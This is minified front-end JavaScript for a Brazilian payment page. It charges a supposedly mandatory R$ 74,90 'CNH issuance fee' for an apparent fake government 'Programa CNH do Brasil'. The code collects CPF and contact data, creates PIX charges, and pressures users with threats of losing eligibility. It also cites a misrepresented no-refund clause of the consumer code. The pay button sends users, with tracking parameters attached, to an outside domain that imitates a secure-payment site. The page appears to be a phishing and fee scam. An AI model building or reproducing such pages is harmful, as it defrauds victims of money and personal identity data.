"use strict";function utmUrl(u){var p=new URLSearchParams(window.location.search),s=[];["utm_source","utm_medium","utm_campaign","utm_term","utm_content","src","sck","xcod","fbclid","gclid"].forEach(function(k){var v=p.get(k);if(v)s.push(k+"="+encodeURIComponent(v))});return s.length?u+(u.indexOf("?")>-1?"&":"?")+s.join("&"):u}(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[66],{2066:(e,a,s)=>{s.r(a),s.d(a,{default:()=>h});var t=s(5155),r=s(63),o=s(2115),c=s(5917),n=s(5299),i=s(5426),l=s(3209),d=s(7003),m=s(1725),x=s(2769),u=s(5421),p=s(3372);function h(){let e=(0,r.useRouter)(),[a,s]=(0,o.useState)(null),[h,g]=(0,o.useState)(!0),[j,b]=(0,o.useState)(!1),[N,f]=(0,o.useState)(null),[v,y]=(0,o.useState)(null),[w,_]=(0,o.useState)("pending"),C=(0,o.useRef)(!1),A=(0,o.useRef)(0),E=(0,o.useRef)(Date.now()),T=(0,o.useRef)(null);(0,o.useEffect)(()=>{(async()=>{if(!C.current){C.current=!0,g(!0),f(null);try{let e=(0,p.w6)("userData");if(!e||!e.cpf||!e.nome){f("Dados do usu\xe1rio n\xe3o encontrados. Por favor, reinicie o processo."),g(!1);return}let a=(0,u.b)(),t=(0,p.bi)("client_ip")||a.client_ip||"";console.log("[PIX Success] UTMs sendo enviadas:",a);let r=await fetch("/api/create-pix",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({amount:74.9,customer_name:e.nome,customer_email:e.email||"cliente@email.com",customer_phone:(e.phone||"").replace(/\D/g,"")||"11999999999",customer_cpf:e.cpf,utm_source:a.utm_source||"",utm_medium:a.utm_medium||"",utm_campaign:a.utm_campaign||"",utm_content:a.utm_content||"",utm_term:a.utm_term||"",fbclid:a.fbclid||"",client_ip:t})}),o=await r.json();if(o.success){if(s(o),o.pix_code)try{let e=await x.toDataURL(o.pix_code,{width:256,margin:2,color:{dark:"#000000",light:"#FFFFFF"}});y(e)}catch(e){console.error("Erro ao gerar QR code:",e)}}else f(o.error||"Erro ao gerar PIX")}catch(e){console.error("Erro ao criar transa\xe7\xe3o PIX:",e),f("Erro ao conectar com o servidor")}finally{g(!1)}}})()},[]),(0,o.useEffect)(()=>{if(!(null==a?void 0:a.transaction_id))return;T.current!==a.transaction_id&&(T.current=a.transaction_id,A.current=0,E.current=Date.now());let s=async()=>{try{A.current+=1;let s=(Date.now()-E.current)/1e3/60;if(A.current>360||s>30)return console.log("[POLL] Limite atingido: ".concat(A.current," tentativas, ").concat(s.toFixed(1)," minutos")),f("Tempo limite excedido. Se voc\xea fez o pagamento, aguarde alguns minutos e acesse novamente."),!0;let t=await fetch("/api/check-pix/".concat(a.transaction_id)),r=await t.json();if(r.success&&r.status){if(_(r.status),"paid"===r.status)return console.log("PAGAMENTO DA TAXA DE EMISS\xc3O CONFIRMADO!"),setTimeout(()=>{e.push("/cadastro-concluido")},1e3),!0;if("expired"===r.status||"cancelled"===r.status)return f("Transa\xe7\xe3o expirada ou cancelada. Por favor, tente novamente."),!0}return!1}catch(e){return console.error("Erro ao verificar status:",e),!1}},t=setInterval(async()=>{await s()&&clearInterval(t)},5e3);return()=>clearInterval(t)},[null==a?void 0:a.transaction_id,e]);let P=async()=>{if(null==a?void 0:a.pix_code)try{await navigator.clipboard.writeText(a.pix_code),b(!0),setTimeout(()=>b(!1),2e3)}catch(e){console.error("Erro ao copiar:",e)}};return"paid"===w?(0,t.jsxs)("div",{className:"min-h-screen bg-gradient-to-b from-gray-50 to-white",children:[(0,t.jsx)(m.A,{}),(0,t.jsx)("main",{className:"container mx-auto px-4 py-8",children:(0,t.jsx)(l.Zp,{className:"max-w-xl mx-auto",children:(0,t.jsx)(l.Wu,{className:"pt-6",children:(0,t.jsxs)("div",{className:"text-center",children:[(0,t.jsx)("div",{className:"w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",children:(0,t.jsx)(c.A,{className:"w-8 h-8 text-green-600"})}),(0,t.jsx)("h2",{className:"text-2xl font-bold text-green-600 mb-2",children:"Pagamento Confirmado!"}),(0,t.jsx)("p",{className:"text-gray-600",children:"Seu cadastro foi conclu\xeddo com sucesso!"}),(0,t.jsx)("p",{className:"text-gray-500 text-sm mt-2",children:"Redirecionando..."})]})})})})]}):(0,t.jsxs)("div",{className:"min-h-screen bg-gradient-to-b from-gray-50 to-white",children:[(0,t.jsx)(m.A,{}),(0,t.jsx)("main",{className:"container mx-auto px-4 py-8",children:(0,t.jsxs)(l.Zp,{className:"max-w-xl mx-auto shadow-lg border-0",children:[(0,t.jsxs)(l.aR,{className:"text-center space-y-2 pb-4 border-b",children:[(0,t.jsx)(l.ZB,{className:"text-2xl font-bold text-gray-900",children:"Taxa de Emiss\xe3o da CNH"}),(0,t.jsx)("p",{className:"text-gray-600",children:"Esta \xe9 a \xfaltima taxa obrigat\xf3ria. Ap\xf3s a confirma\xe7\xe3o do pagamento, voc\xea receber\xe1 acesso completo ao aplicativo do Programa CNH do Brasil."})]}),(0,t.jsxs)(l.Wu,{className:"pt-6",children:[(0,t.jsx)("div",{className:"flex justify-center mb-6",children:(0,t.jsx)("img",{src:"images/Lancada-a-Carteira-Digital-de-Transito.jpg.webp",alt:"Carteira Digital de Tr\xe2nsito",className:"max-w-full h-auto rounded-lg shadow-md",style:{maxHeight:"200px"}})}),(0,t.jsxs)("div",{className:"bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",children:[(0,t.jsx)("h4",{className:"font-semibold text-blue-900 mb-2 text-center",children:"Importante"}),(0,t.jsxs)("ul",{className:"text-sm text-blue-800 space-y-2",children:[(0,t.jsxs)("li",{children:["• Esta taxa \xe9 ",(0,t.jsx)("strong",{children:"obrigat\xf3ria"})," para finalizar seu cadastro no Programa CNH do Brasil"]}),(0,t.jsxs)("li",{children:["• Valor \xfanico de ",(0,t.jsx)("strong",{children:"R$ 74,90"})," pago uma \xfanica vez"]}),(0,t.jsx)("li",{children:"• Taxa destinada ao processo de emiss\xe3o e regulariza\xe7\xe3o da CNH"}),(0,t.jsx)("li",{children:"• Seu cadastro s\xf3 ser\xe1 conclu\xeddo ap\xf3s a confirma\xe7\xe3o deste pagamento"})]})]}),(0,t.jsxs)("div",{className:"bg-red-50 p-4 rounded-lg border border-red-200 mb-6",children:[(0,t.jsx)("h4",{className:"font-semibold text-red-800 mb-2 text-center",children:"⚠️ Aten\xe7\xe3o"}),(0,t.jsxs)("p",{className:"text-sm text-red-700",children:["Informamos que, caso o pagamento da ",(0,t.jsx)("strong",{children:"Taxa de Emiss\xe3o da CNH"})," n\xe3o seja realizado, seu cadastro ",(0,t.jsx)("strong",{children:"n\xe3o ser\xe1 conclu\xeddo"})," e voc\xea ",(0,t.jsx)("strong",{children:"perder\xe1 o direito de participar do Programa CNH do Brasil"}),". Conforme o art. 49, \xa72\xba da Lei n\xba 8.078/1990 (C\xf3digo de Defesa do Consumidor), n\xe3o haver\xe1 reembolso do valor j\xe1 pago referente \xe0s taxas administrativas, uma vez que o servi\xe7o de processamento j\xe1 foi iniciado junto ao DETRAN."]})]}),(0,t.jsxs)("div",{className:"text-center mb-6",children:[(0,t.jsx)("p",{className:"text-3xl font-bold text-green-600",children:"R$ 74,90"}),(0,t.jsx)("p",{className:"text-gray-600",children:"Taxa \xfanica de emiss\xe3o"})]}),(0,t.jsx)("div",{className:"px-6 pb-6",children:(0,t.jsx)("button",{onClick:function(){window.location.href=utmUrl("https://pay.pagamentos-seguros2025.site/P5LNZ8zy4kMgaRy")},className:"w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-lg text-lg transition-all shadow-lg",children:"PAGAR TAXA DE EMISSÃO"})})]})]})})]})}},5299:(e,a,s)=>{s.d(a,{A:()=>t});let t=(0,s(1847).A)("LoaderCircle",[["path",{d:"M21 12a9 9 0 1 1-6.219-8.56",key:"13zald"}]])}}]);